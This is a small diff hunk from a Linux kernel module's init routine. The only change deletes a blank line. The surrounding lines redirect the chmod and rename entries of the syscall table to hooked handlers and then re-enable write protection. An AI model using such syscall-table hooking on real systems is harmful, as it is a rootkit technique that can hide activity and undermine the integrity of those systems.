@@ -342,7 +342,6 @@ static int __init mycall_init(void)
     original_syscall_table[__NR_chmod] = (unsigned long)hooked_sys_chmod;
     original_syscall_table[__NR_rename] = (unsigned long)hooked_sys_rename;
 
-
     turn_on_wr_protect(original_syscall_table);
     return 0;
 }
